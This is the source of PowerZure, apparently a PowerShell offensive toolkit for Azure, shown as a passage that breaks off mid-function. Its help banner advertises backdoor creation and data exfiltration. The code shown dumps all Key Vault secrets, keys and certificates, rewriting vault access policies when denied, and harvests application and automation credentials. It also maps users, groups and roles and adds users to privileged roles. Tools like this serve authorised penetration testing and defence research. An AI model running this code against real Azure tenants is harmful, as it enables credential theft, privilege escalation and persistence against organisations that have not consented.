Set-ExecutionPolicy Bypass
#Version Check
$ErrorActionPreference = "Stop"
$Version = $PSVersionTable.PSVersion.Major
If ($Version -lt 5)
{
    Write-Host "Az requires at least PowerShell 5.1"
}
#Module Check
$Modules = Get-InstalledModule
If ($Modules.Name -contains 'Az')
{
}
Else
{
    Write-Host "Az Module not installed. Installing."
    #This installs the Az module
    Install-Module -Name Az -AllowClobber
    #This installs the Az CLI modules
    Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'
    $directory = pwd
    #After installing the modules, PS needs to be restarted and PowerZure needs to be reimported.
    Start-Process powershell.exe -argument "-noexit -command ipmo '$directory\PowerZure.ps1'"
    #Killing old PS window
    Stop-Process -Id $PID
}
#Login Check
$ErrorActionPreference = "silentlyContinue"
Try
{  
    $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
    if ($User.Length -gt 1)
    {
    $Id = az ad signed-in-user show --query '[objectId]' -o tsv
    Write-Host "Welcome $User"
    Write-Host ""
    Write-Host "Please set your default subscription with 'Set-Subscription --subscription {id}"
    Write-Host ""
    Write-Host "Here are the subscriptions you have access to:"
    Write-Host ""
    az account list --query '[].{SubscriptionName:name,Id:id,TenantId:tenantId}' -o Table
    Write-Host ""
    Write-Host "Here are your roles:" 
    Write-Host ""
    az role assignment list --all --query "[?principalName=='$User'].{Role:roleDefinitionName,ResoureGroup:resourceGroup}" -o table
    Write-Host ""
    Write-Host "Here are the AD groups you belong to:"
    Write-Host ""
    az ad user get-member-groups --id $Id -o table
    Write-Host ""
    Write-Host "Try PowerZure -h for a list of functions"
    Write-Host ""
    }
    else
    {
    Write-Host "Please login via az login"
    }

}
Catch
{
    Write-Host "Please login via az login"
}

function Set-Subscription
{
<# 
.SYNOPSIS
    Sets default subscription
.PARAMETER
   -Id
.EXAMPLE
   Set-Subscription -Id b049c906-7000-4899-b644-f3eb835f04d0
#>

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$Id = $null) 
    
    if($Id -eq "")
    {
        Write-Host "Must enter a subscription ID. Try Get-CurrentUser to see a list of subscriptions" -ForegroundColor Red
        Write-Host "Usage: Set-Subscription -Id b049c906-7000-4899-b644-f3eb835f04d0 " -ForegroundColor Red
    }
    else
    {
        az account set --subscription $Id
    }
}

function PowerZure
{
<# 
.SYNOPSIS
    Displays info about this script.

.PARAMETER 
    -h (Help)

.EXAMPLE
    PowerZure -h
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true)][switch]$h = $null)

        if($h -eq $true)
        {
            Write-Host @"

                             PowerZure Version 1.0

                               List of Functions


--Role Needed-- ------------------Mandatory ----------------

Reader          Set-Subscription - Sets the default Subscription to operate in

                ------------------Operational --------------

Contributor     Execute-Command - Will run a command on a specified VM
Contributor     Execute-MSBuild - Will run a supplied MSBuild payload on a specified VM. By default, Azure VMs have .NET 4.0 installed. Requires Contributor Role. Will run as SYSTEM.
Contributor     Execute-Program - Executes a supplied program. 
Administrator   Create-Backdoor - Will create a Runbook that creates an Azure account and generates a Webhook to that Runbook so it can be executed if you lose access to Azure. 
                Also gives the ability to upload your own .ps1 file as a Runbook (Customization)
                This requires an account that is part of the 'Administrators' Role (Needed to make a user)
Administrator   Execute-Backdoor - This runs the backdoor that is created with "Create-Backdoor". Needs the URI generated from Create-Backdoor
Contributor     Upload-StorageContent - Uploads a supplied file to a storage share.
Contributor     Stop-VM - Stops a VM
Contributor     Start-VM - Starts a VM
Contributor     Restart-VM - Restarts a VM
Contributor     Start-Runbook - Starts a specific Runbook
Owner           Set-Role - Adds a user to a role for a resource or a subscription
Owner           Remove-Role -Removes a user from a role on a resource or subscription
Administrator   Set-Group - Adds a user to an Azure AD group


                ------------------Info Gathering -------------

Reader          Get-CurrentUser - Returns the current logged in user name, their role + groups, and any owned objects
Reader          Get-AllUsers - Lists all users in the subscription
Reader          Get-User - Gathers info on a specific user
Reader          Get-AllGroups - Lists all groups + info within Azure AD
Reader          Get-Resources - Lists all resources in the subscription
Reader          Get-Apps - Lists all applications in the subscription
Reader          Get-GroupMembers - Gets all the members of a specific group. Group does NOT mean role.
Reader          Get-AllGroupMembers - Gathers all the group members of all the groups.
Reader          Get-AllRoleMembers - Gets all the members of all roles. Roles does not mean groups.
Reader          Get-RoleMembers -  Gets the members of a role 
Reader          Get-Roles - Gets the roles of a user
Reader          Get-ServicePrincipals - Returns all service principals
Reader          Get-ServicePrincipal - Returns all info on a specified service principal
Reader          Get-Apps - Returns all applications and their Ids
Reader          Get-AppPermissions - Returns the permissions of an app
Reader          Get-WebApps - Gets running webapps
Reader          Get-WebAppDetails - Gets running webapps details

                ---------Secret/Key/Certificate Gathering -----
            
Reader          Get-KeyVaults - Lists the Key Vaults
Contributor     Get-KeyVaultContents - Get the keys, secrets, and certificates from a specific Key Vault
Contributor     Get-AllKeyVaultContents - Gets ALL the keys, secrets, and certificates from all Key Vaults. If the logged in user cannot access a key vault, It tries to 
Contributor     Get-AppSecrets - Returns the application passwords or certificate credentials
Contributor     Get-AllAppSecrets - Returns all application passwords or certificate credentials (If accessible)
Contributor     Get-AllSecrets - Gets ALL the secrets from all Key Vaults and applications. If the logged in user cannot access a key vault or application, it ignores the error and trys the other ones. Errors are suppressed.
Contributor     Get-AutomationCredentials - Gets the credentials from any Automation Accounts
           
                -----------------Data Exfiltration--------------
            
Reader          Get-StorageAccounts - Gets all storage accounts
Contributor     Get-StorageAccountKeys -  Gets the account keys for a storage account
Reader          Get-StorageContents - Gets the contents of a storage container or file share. OAuth is not support to access file shares via cmdlets, so you must have access to the Storage Account's key.
Reader          Get-Runbooks - Lists all the Runbooks
Reader          Get-Runbook - Reads content of a specific Runbook
Reader          Get-AvailableVMDisks -  Lists the VM disks available. 
Contributor     Get-VMDisk - Generates a link to download a Virtual Machiche's disk. The link is only available for an hour.
Reader          Get-VMs - Lists available VMs      


"@

        }
        else
        {
        Write-Host "Try PowerZure -h"
        }
}

function Get-Resources
{
 <#
.SYNOPSIS
    Lists all resources
#>

        az resource list --query '[].{Name:name,RG:resourceGroup,Location:location}' -o table
}

function Get-AllUsers 
{
<# 
.SYNOPSIS
    List all Azure users in the tenant
.PARAMETER
    OutFile (.csv is special)
.EXAMPLE
    Get-AzureUsers
    Get-AzureUsers -OutFile users.csv
    Get-AzureUsers -OutFile users.txt
#>

    [CmdletBinding()]
     Param(
        [Parameter(Mandatory=$false)][String]$OutFile = $null)    

    $split = $OutFile.Split(".")
    $type = $split[-1]
    $name = $split[0]
    
    If($type -eq "csv")
    {
        $i=az ad user list -o json | ConvertFrom-Json
        $i | export-csv $OutFile
    } 
    else
    {
        If($Outfile)
        {
         $i=az ad user list --query '[].{Name:mail,ObjectType:objectType,DN:onPremisesDistinguishedName,UPN:userPrincipalName,UserType:userType}' -o table | Out-File $OutFile
        }
        else 
        {
        az ad user list --query '[].{Name:mail,ObjectType:objectType,DN:onPremisesDistinguishedName,UPN:userPrincipalName,UserType:userType}' -o yaml
        }
	}

}

function Get-User 
{
<# 
.SYNOPSIS
    Gathers info on a specific user

.PARAMETER 
    User Principal Name

.EXAMPLE
    Get-AzureUser -User Test@domain.com
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$User = "")

    If($User -eq "") 
    {
        Write-Host  "Requires a username in the format of 'user@domain.com'" -ForegroundColor Red
        Write-Host  "Usage example: Get-AzureUser -User Test@domain.com" -ForegroundColor Red
    }
    else
    {
        $Id = az ad user list --query "[?userPrincipalName=='$User'].{Id:objectId}" -o tsv
        $Username = az ad user list --upn $User --query '[].{UPN:userPrincipalName,ObjectType:objectType,DN:onPremisesDistinguishedName,UserType:userType,Enabled:accountEnabled}' -o yaml
        $Name = az ad user list --display-name $User --query '[].{UPN:userPrincipalName}' -o tsv
        $Roles = az role assignment list --all --query "[?principalName=='$User'].{Role:roleDefinitionName}" -o yaml
        $Groups = az ad user get-member-groups --id $Id -o yaml

        If($Username -eq '[]')
        {
        Write-Host "User doesn't exist. Make sure you're using the UPN, e.g. User@domain.com"
        }
        Else
        {
        $Username
        Write-Host ""
        Write-Host "Roles:"
        $Roles
        Write-Host ""
        Write-Host "AD Group Memberships:"
        $Groups
        }
    }
}

function Get-AllGroups 
{
<# 
.SYNOPSIS
    Gathers all the groups in the tenant
.PARAMETERS
    OutFile (.csv is special)
.EXAMPLE
    Get-AzureGroups
    Get-AzureGroups -OutFile users.csv
    Get-AzureGroups -outFile users.txt
#>

    [CmdletBinding()]
     Param(
        [Parameter(Mandatory=$false)][String]$OutFile = $null)    

        $split = $OutFile.Split(".")
        $type = $split[-1]
        $name = $split[0]
        If($type -eq "csv")
        {
            $i= az ad group list -o json | ConvertFrom-Json
            $i | export-csv $OutFile
        } 
        else
        {
            If($Outfile)
            {
             $i=az ad group list --query='[].{Group:displayName,Description:description}' -o table | Out-File $OutFile
            }
            else 
            {
             az ad group list --query='[].{Group:displayName,Description:description}' -o table
            }
	    }
     
}

function Get-Apps 
{
<# 
.SYNOPSIS
    Gathers all the application in Azure 
.PARAMETERS
    OutFile (.csv is special)
.EXAMPLE
    Get-AzureApps
    Get-AzureApps -OutFile users.csv
    Get-AzureApps -outFile users.txt
#>

    [CmdletBinding()]
     Param(
        [Parameter(Mandatory=$false)][String]$OutFile = $null)    

    $split = $OutFile.Split(".")
    $type = $split[-1]
    $name = $split[0]
    If($type -eq "csv")
    {
        $i= az ad app list -o json | ConvertFrom-Json
        $i | export-csv $OutFile
    } 
    else
    {
        If($Outfile)
        {
         $i=az ad app list --query='[].{Name:displayName,URL:homepage}' -o yaml | Out-File $OutFile
        }
        else 
        {
         az ad app list --query='[].{Name:displayName,URL:homepage,id:objectId}' -o yaml
        }
	}
    
}

function Get-GroupMembers 
{
<# 
.SYNOPSIS
    Gets all the members of a specific group. Group does NOT mean role.

.PARAMETER 
    Group name
    OutFile (Optional) (.csv is special)

.EXAMPLE
    Get-AzureGroupMembers -Group 'SQL Users'
    Get-AzureGroupMembers -Group 'SQL Users' -OutFile users.csv
    
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false)][String]$Group = $null,
        [Parameter(Mandatory=$false)][String]$OutFile = $null) 

    If($GroupMembers -eq "") 
    
    {
        Write-Host  "Requires a name of an AD Group" -ForegroundColor Red
        Write-Host  "Usage: Get-AzureGroupMembers 'SQL Users'" -ForegroundColor Red
        Write-Host  "       Get-AzureGroupMembers 'SQL Users' -OutFile users.csv" -ForegroundColor Red
    }
    else
    { 
        $split = $OutFile.Split(".")
        $type = $split[-1]
        $name = $split[0]
        If($type -eq "csv")
        {
            $i= az ad group member list -g $Group -o json | ConvertFrom-Json
            $i | export-csv $OutFile
        } 
        else
        {
            If($Outfile)
            {
             $i=az ad group member list -g $Group --query='[].{Name:mailNickname,UPN:userPrincipalName}' -o yaml | Out-File $OutFile
            }
            else 
            {
             az ad group member list -g $Group --query='[].{Name:mailNickname,UPN:userPrincipalName}' -o yaml
            }
	    }
     }
    
}

function Get-AllGroupMembers 
{
<# 
.SYNOPSIS
    Gathers all the group members of all the groups.

.PARAMETER 
    OutFile (.csv not supported)

.EXAMPLE
    Get-AllAzureGroupMembers -OutFile members.txt
    
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$OutFile = $null) 

        If($Outfile)
        {
             Write-Host "Gathering all group members may take a moment"
             Write-Host ""
             $groups=az ad group list --query '[].displayName' -o tsv
             ForEach ($group in $groups){
                  $members = az ad group member list --group $group --query '[].displayName' -o tsv 
                     ForEach ($member in $members){ 
                        Write-Output "Group Name:" $group "Group Members:"$member | Out-File $OutFile}} 
        }
        else 
        {
             Write-Host "Gathering all group members may take a moment"
             Write-Host ""
             $groups=az ad group list --query '[].displayName' -o tsv
             ForEach ($group in $groups){
                  $members = az ad group member list --group $group --query '[].displayName' -o tsv 
                     ForEach ($member in $members){ 
                        Write-Output "Group Name:" $group "Members:"$member 
                        Write-Host ""}} 
        }
}

function Set-Group 
{
<# 
.SYNOPSIS
    Adds a user to an Azure AD Group

.PARAMETER 
    -User (UPN of the user)
    -Group (AAD Group name)

.EXAMPLE
    Set-Group -User john@contoso.com -Group 'SQL Users'
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$Group = $null,
    [Parameter(Mandatory=$false)][String]$User = $null)    

    If($User -eq "")
    {
        Write-Host "Requires a UserPrincipalName, e.g. User@domain.com" -ForegroundColor Red
        Write-Host "Usage Example: Set-Group -User john@contoso.com -Group 'SQL Users'" -ForegroundColor Red
    }
    elseif($Group -eq "")
    {
        Write-Host "Requires a Group name, e.g. Administrators" -ForegroundColor Red
        Write-Host "Usage Example: Set-Group -User john@contoso.com -Group 'SQL Users'" -ForegroundColor Red
    }
    else
    {
        $Id = az ad user list --query "[?userPrincipalName=='$User'].{Id:objectId}" -o tsv
        az ad group member add --group $Group --member-id $Id
    }

}

function Get-AllRoleMembers 
{
<# 
.SYNOPSIS
    Gets all the members of all roles. Roles does not mean groups.

.PARAMETERS
    OutFile (.csv is special)
.EXAMPLE
    Get-AllAzureRoleMembers
    Get-AllAzureRoleMembers -OutFile users.csv
    Get-AllAzureRoleMembers -outFile users.txt
#>

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$OutFile = $null)    

    $split = $OutFile.Split(".")
    $type = $split[-1]
    $name = $split[0]
    If($type -eq "csv")
    {
        $i= az role assignment list --all -o json | ConvertFrom-Json
        $i | export-csv $OutFile
        $e=az role assignment list --include-classic-administrators true -o table | Out-File -Append $OutFile
        $e | Out-File -Append $OutFile
    } 
    else
    {
        If($Outfile)
        {
         $i=az role assignment list --all --query '[].{Role:roleDefinitionName,Name:principalName,Type:principalType}' -o table 
         $i | Out-File $OutFile
         $e=az role assignment list --include-classic-administrators true -o table 
         $e | Out-File -Append $OutFile
        }
        else 
        {
        az role assignment list --include-classic-administrators true -o table
        Write-Host ""
        az role assignment list --all --query '[].{Principal:principalName,Role:roleDefinitionName,Type:principalType}' -o table
        }
	}
}

function Get-Roles
{
<# 
.SYNOPSIS
    Lists the roles of a specific user.

.PARAMETER 
    -User (john@contoso.com)

.EXAMPLE
    Get-Rolesr -User john@contoso.com
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$User = $null)
    
    If($User -eq "") 
    {
        Write-Host  "Requires a username in the format of 'user@domain.com'" -ForegroundColor Red
        Write-Host  "Usage: Get-Roles -User Test@domain.com" -ForegroundColor Red
    }
    else
    {
        az role assignment list --all --query "[?principalName=='$User']" -o yaml
    }
}

function Get-RoleMembers  
{
<# 
.SYNOPSIS
    Gets the members of a role. Capitalization matters (i.e. reader vs Reader <---correct)

.PARAMETER 
    -Role

.EXAMPLE
    Get-RoleMembers Reader
    
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$Role = $null)

    if($Role -eq "")
    {
        Write-Host  "Requires a role" -ForegroundColor Red
        Write-Host  "Usage: Get-RoleMembers Reader" -ForegroundColor Red
    }
    else
    {
    
        az role assignment list --all --query "[?roleDefinitionName=='$Role'].{Role:roleDefinitionName,Name:principalName,Type:principalType,ResourceGroup:resourceGroup}" -o table
    }
}

function Set-Role
{
<# 
.SYNOPSIS
    Assigns a user a role for a specific resource or subscription 

.PARAMETER 
    -User
    -Role
    -Resource
    -Subscription (Name of subscription)

.EXAMPLE
    Set-Role -Role Owner -User john@contoso.com -Resource WIN10VM
    Set-Role -Role Owner -User john@contoso.com -Subscription SubName
    
#>

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$Resource = $null,
    [Parameter(Mandatory=$false)][String]$Subscription = $null,
    [Parameter(Mandatory=$false)][String]$User = $null,
    [Parameter(Mandatory=$false)][String]$Role = $null)

    if($Subscription)
        {
           $assign=az role assignment create --assignee $User --role $Role --subscription $Subscription
           if(!$assign)
           {
                Write-Host "Failed to assign role."
           }
           else
           {
                Write-Host "Successfully added $User to $Role for $Subscription"
           }
        }

    elseif($User -eq "")
        {
            Write-Host "Requires a User name." -ForegroundColor Red
            Write-Host "Usage Example: Set-Role -Role Owner -User john@contoso.com -Resource WIN10VM" -ForegroundColor Red
            Write-Host "Usage Example: Set-Role -Role Owner -User john@contoso.com -Subscription SubName" -ForegroundColor Red
        }
    elseif($Role -eq "")
        {
            Write-Host "Requires a Role name." -ForegroundColor Red
            Write-Host "Usage Example: Set-Role -Role Owner -User john@contoso.com -Resource WIN10VM" -ForegroundColor Red
            Write-Host "Usage Example: Set-Role -Role Owner -User john@contoso.com -Subscription SubName" -ForegroundColor Red
        }
    else
        {
            if($Resource -eq "")
            {
                 Write-Host "Requires a Resource name." -ForegroundColor Red
                 Write-Host "Usage Example: Set-Role -Role Owner -User john@contoso.com -Resource WIN10VM" -ForegroundColor Red
                 Write-Host "Usage Example: Set-Role -Role Owner -User john@contoso.com -Subscription SubName" -ForegroundColor Red
            }
            else
            {
                $Scope = az resource list --name $Resource --query '[].{id:id}' -o tsv
                try
                {
                    $create = az role assignment create --role $Role --assignee $User --scope $Scope | Out-Null
                    If(!$create)
                    {
                        Write-Host "Failed to add $User to $Role for $Resource"
                    }
                    else
                    {
                        
                        Write-Host "Successfully added $User to $Role for $Resource"
                    }
                
                }
                catch
                {  
                }
            }
        }

}

function Remove-Role
{
<# 
.SYNOPSIS
    Removes a user from a role on a specific resource or subscription 

.PARAMETER 
    -User
    -Role
    -Resource
    -Subscription (Name of subscription)

.EXAMPLE
    Remove-Role -Role Owner -User john@contoso.com -Resource WIN10VM
    Remove-Role -Role Owner -User john@contoso.com -Subscription SubName
    
#>

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$Resource = $null,
    [Parameter(Mandatory=$false)][String]$Subscription = $null,
    [Parameter(Mandatory=$false)][String]$User = $null,
    [Parameter(Mandatory=$false)][String]$Role = $null)

    if($Subscription)
        {
           $assign=az role assignment delete --assignee $User --role $Role --subscription $Subscription
           if(!$assign)
           {
                Write-Host "Successfully deleted $User from $Role for $Subscription"    
           }
           else
           {
                Write-Host "Failed to delete role."
           }
        }

    elseif($User -eq "")
        {
            Write-Host "Requires a User name." -ForegroundColor Red
            Write-Host "Usage Example: Remove-Role -Role Owner -User john@contoso.com -Resource WIN10VM" -ForegroundColor Red
            Write-Host "Usage Example: Remove-Role -Role Owner -User john@contoso.com -Subscription SubName" -ForegroundColor Red
        }
    elseif($Role -eq "")
        {
            Write-Host "Requires a Role name." -ForegroundColor Red
            Write-Host "Usage Example: Remove-Role -Role Owner -User john@contoso.com -Resource WIN10VM" -ForegroundColor Red
            Write-Host "Usage Example: Remove-Role -Role Owner -User john@contoso.com -Subscription SubName" -ForegroundColor Red
        }
    else
        {
            if($Resource -eq "")
            {
                 Write-Host "Requires a Resource name." -ForegroundColor Red
                 Write-Host "Usage Example: Remove-Role -Role Owner -User john@contoso.com -Resource WIN10VM" -ForegroundColor Red
                 Write-Host "Usage Example: Remove-Role -Role Owner -User john@contoso.com -Subscription SubName" -ForegroundColor Red
            }
            else
            {
                $Scope = az resource list --name $Resource --query '[].{id:id}' -o tsv
                try
                {
                    $create = az role assignment delete --role $Role --assignee $User --scope $Scope | Out-Null
                    If(!$create)
                    {
                        Write-Host "Successfully deleted $User from $Role for $Resource"
                    }
                    else
                    {
                        Write-Host "Failed to delete $User to $Role for $Resource"
                        
                    }
                
                }
                catch
                {  
                }
            }
        }

}

function Get-KeyVaults
{
<# 
.SYNOPSIS
    Lists the Key Vaults
#>
    az keyvault list --query '[].{Name:name,ResourceGroup:resourceGroup,Tags:tags}' -o yaml
}

function Get-KeyVaultContents
{
<# 
.SYNOPSIS
    Get the secrets from a specific Key Vault

.PARAMETER 
    -Name (Key Vault Name)

.EXAMPLE
    Get-KeyVaultContents -Name VaultName
    
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$Name = "")
    $ErrorActionPreference= 'silentlycontinue'
     
     if($Vault -eq "")
     {
        Write-Host "Requires Vault name" -ForegroundColor Red
        Write-Host "Usage example: Get-KeyVaultSecrets VaultName" -ForegroundColor Red
     }
     else
     {
        $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
        $id=az keyvault secret list --vault-name $Name --query '[].id' -o tsv
        if(!$id)
        {
            Write-Host "Detected Permissions issue, trying to fix it."
            $access = az keyvault set-policy --name $Name --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list | Out-Null
            if(!$access)
            {
               Write-Host "Couldn't change permissions on the Key Vault. Are you Global Contributor?"
               return
            }
            az keyvault secret show --id $id | ConvertFrom-Json
            az keyvault certificate show --id $id | ConvertFrom-Json
            az keyvault key show --id $id | ConvertFrom-Json

            return
        }
        else
        {
            az keyvault secret show --id $id | ConvertFrom-Json
            az keyvault certificate show --id $id | ConvertFrom-Json
            az keyvault key show --id $id | ConvertFrom-Json
        }
            
     } 
}

function Get-AllKeyVaultContents
{
<# 
.SYNOPSIS
    Gets ALL the secrets from all Key Vaults. If the logged in user cannot access a key vault, it tries to edit the access policy to allow access.

#>
    Write-Host "Gathering all keys from key vaults, this may take a moment"
    $vaults=az keyvault list --query '[].name' -o tsv
    $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
    ForEach ($vault in $vaults)
    {
        $ids = az keyvault secret list --vault-name $vault --query '[].id' -o tsv
        if(!$ids)
        {
            Write-Host "Detected Permissions issue, trying to fix it."
            $access = az keyvault set-policy --name $vault --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
            if(!$access)
            {
               Write-Host "Couldn't change permissions on the Key Vault. Are you Global Contributor?"
               continue
            }
            $kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
            $cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
            ForEach ($i in $ids)
            {
                az keyvault secret show --id $i | ConvertFrom-Json
            }
            ForEach ($kid in $kids)
            {
                az keyvault secret show --id $kid | ConvertFrom-Json
            }
            ForEach ($cid in $cids)
            {
                az keyvault secret show --id $cid | ConvertFrom-Json
            }
        } 
        else
        {
        $kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
        $cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
            ForEach ($i in $ids)
            {
                az keyvault secret show --id $i | ConvertFrom-Json
            }
            ForEach ($kid in $kids)
            {
                az keyvault secret show --id $kid | ConvertFrom-Json
            }
            ForEach ($cid in $cids)
            {
                az keyvault secret show --id $cid | ConvertFrom-Json
            }
        
        }
    }
}

function Get-CurrentUser
{
<#
.SYNOPSIS
    Returns the current logged in user name and any owned objects
#>
    az ad signed-in-user show -o json | ConvertFrom-Json
    $UID=az ad signed-in-user show --query 'userPrincipalName' -o tsv
    Write-Host ""
    az role assignment list --all --query "[?principalName=='$UID'].{Role:roleDefinitionName,Name:principalName,Type:principalType,ResourceGroup:resourceGroup}" -o table
    Write-Host ""
    Write-Host "Owned Objects:"
    Write-Host ""
    az ad signed-in-user list-owned-objects -o yaml
    Write-Host ""
    Write-Host "Subscriptions:"
    Write-Host ""
    az account list --query '[].{SubscriptionName:name,Id:id,TenantId:tenantId}' -o Table
    
}

function Get-ServicePrincipals
{
<#
.SYNOPSIS
    Returns all service principals
#>
    az ad sp list --query '[].{Name:displayName,Type:servicePrincipalType,Enabled:accountEnabled,SPN:servicePrincipalNames,id:objectId}' -o yaml
}

function Get-ServicePrincipal
{
<#
.SYNOPSIS
    Returns all info on a service principal
.PARAMETER
    -Id (Id of SP)
.EXAMPLE
    Get-ServicePrincipal --id fdb54b57-a416-4115-8b21-81c73d2c2deb
#>
    
        [CmdletBinding()]
        Param(
        [Parameter(Mandatory=$false)][String]$Id = $null)
        
     if($Id -eq "")
     {
        Write-Host "Requires Service Principal Id" -ForegroundColor Red
        Write-Host "Usage example: Get-ServicePrincipal --id fdb54b57-a416-4115-8b21-81c73d2c2deb" -ForegroundColor Red
     }
     else
     {
        
        az ad sp show --id $Id
     }
}

function Get-Apps
{
<#
.SYNOPSIS
    Returns all applications and their Ids
#>
    az ad app list --query '[].{Name:displayName,Id:appId}' -o table

}

function Get-AppPermissions
{
<#
.SYNOPSIS
    Returns the permissions of an app
.PARAMETER
    -Id 
.EXAMPLE
    Get-AppPermissions -Id fdb54b57-a416-4115-8b21-81c73d2c2deb
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$Id = $null)

     if($Id -eq "")
     {
        Write-Host "Requires Application Id" -ForegroundColor Red
        Write-Host "Usage example: Get-AppPermissions --id fdb54b57-a416-4115-8b21-81c73d2c2deb" -ForegroundColor Red
     }
     else
     {

        az ad app permission list --id $Id
     }
}

function Get-AppSecrets
{
<#
.SYNOPSIS
    Returns the application passwords or certificate credentials
.PARAMETER
    Name of App
.EXAMPLE
    Get-AppSecrets
#>
        [CmdletBinding()]
         Param(
         [Parameter(Mandatory=$false)][String]$Id = $null)
         if($Id -eq "")
         {
            Write-Host "Requires Application Id" -ForegroundColor Red
            Write-Host "Usage example: Get-AppSecrets --id fdb54b57-a416-4115-8b21-81c73d2c2deb" -ForegroundColor Red
         }
         else
         {

            az ad app credential list --id $Id
         }
}

function Get-AllAppSecrets
{
<#
.SYNOPSIS
    Returns all application passwords or certificate credentials (If accessible)
#>

    $ErrorActionPreference = "SilentlyContinue"
    $ids=az ad app list --query='[].{id:objectId}' -o tsv
    ForEach ($id in $ids){
                 az ad app credential list --id $id | ConvertFrom-Json
                    }
        
}

function Get-AllSecrets #
{
<# 
.SYNOPSIS
    Gets ALL the secrets from all Key Vaults and applications. If the logged in user cannot access a key vault or application, it ignores the error and trys the other ones. Errors are suppressed.

#>
    Write-Host "Gathering all keys from key vaults, this may take a moment"
    $vaults=az keyvault list --query '[].name' -o tsv
    $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
    ForEach ($vault in $vaults)
    {
        $ids = az keyvault secret list --vault-name $vault --query '[].id' -o tsv
        if(!$ids)
        {
            Write-Host "Detected Permissions issue, trying to fix it."
            $access = az keyvault set-policy --name $vault --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
            if(!$access)
            {
               Write-Host "Couldn't change permissions on the Key Vault. Are you Global Contributor?"
               continue
            }
            $kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
            $cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
            ForEach ($i in $ids)
            {
                az keyvault secret show --id $i | ConvertFrom-Json
            }
            ForEach ($kid in $kids)
            {
                az keyvault secret show --id $kid | ConvertFrom-Json
            }
            ForEach ($cid in $cids)
            {
                az keyvault secret show --id $cid | ConvertFrom-Json
            }
        } 
        else
        {
        $kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
        $cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
            ForEach ($i in $ids)
            {
                az keyvault secret show --id $i | ConvertFrom-Json
            }
            ForEach ($kid in $kids)
            {
                az keyvault secret show --id $kid | ConvertFrom-Json
            }
            ForEach ($cid in $cids)
            {
                az keyvault secret show --id $cid | ConvertFrom-Json
            }
        
        }
    }
    Write-Host ""
    Write-Host "Gathering all secrets from applications, this may take a moment"    
    $ids=az ad app list --query='[].{id:objectId}' -o tsv
    ForEach ($id in $ids){
                 az ad app credential list --id $id | ConvertFrom-Json
                    } 
    Write-Host ""
    Write-Host "Listing Automation Account Credentials. Unforunately passwords are abstraced :("
    $Data = Get-AzAutomationAccount
    $RG = $Data.ResourceGroupName
    $AA = $Data.AutomationAccountName
    Get-AzAutomationCredential -AutomationAccountName $AA -ResourceGroupName $RG

}

function Get-WebApps
{
<#
.SNYOPSIS 
    Gets running webapps
#>
    az webapp list --query "[?state=='Running']"
}

function Get-WebAppDetails
{
<#
.SYNOPSIS 
    Gets running webapps details
.PARAMETER
    -Name (of webapp)
.EXAMPLE
    Get-WebAppDetails WebAppName
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$Name = $null)

         if($Name -eq "")
         {
            Write-Host "Requires WebApp Name" -ForegroundColor Red
            Write-Host "Usage example: Get-WebAppDetails -Name WebAppName" -ForegroundColor Red
         }
         else
         {
        
             az webapp show --name $name
         }
}

function Get-StorageAccounts
{
<#
.SNYOPSIS 
    Gets storage blobs 
#>
    az storage account list --query '[].{Name:name,URL:primaryEndpoints.blob}' -o table
}

function Get-StorageContents
{
<#
.SYNOPSIS 
    Gets the contents of a storage container or file share. OAuth is not support to access file shares via cmdlets, so you must have access to the Storage Account's key.
.PARAMETER
    -ResourceGroup
    -StorageAccount (Name of Storage account. Try Get-StorageAccounts for a list.)
    -File (Gets the contents of a specified file. If file is in a path, include the full path. Optional)
    -NoDelete (Doesn't delete the file after it's downloaded. Optional)
.EXAMPLE
    Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup
    Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File secret.txt -NoDelete
    Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File /path/to/secret.txt
    
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
     [Parameter(Mandatory=$false)][String]$File = $null,
     [Parameter(Mandatory=$false)][switch]$NoDelete = $null,
     [Parameter(Mandatory=$false)][String]$StorageAccount = $null)

     If($ResourceGroup -eq "")
     {
            Write-Host "Requires Resource Group name" -ForegroundColor Red
            Write-Host "Usage example: Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File secret.txt -NoDelete" -ForegroundColor Red
            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File /path/to/secret.txt" -ForegroundColor 
